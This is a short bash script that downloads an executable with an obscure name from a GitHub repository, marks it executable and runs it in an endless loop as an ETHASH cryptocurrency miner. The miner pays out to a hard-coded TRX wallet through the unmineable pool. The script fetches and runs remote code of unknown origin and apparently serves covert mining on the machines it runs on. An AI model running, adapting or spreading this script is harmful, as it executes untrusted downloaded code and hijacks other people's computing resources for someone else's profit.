#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNtTHy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
WORKER=kuli02
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
	while [ 1 ]; do
		./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
        sleep 5
	done
sleep 999999999 
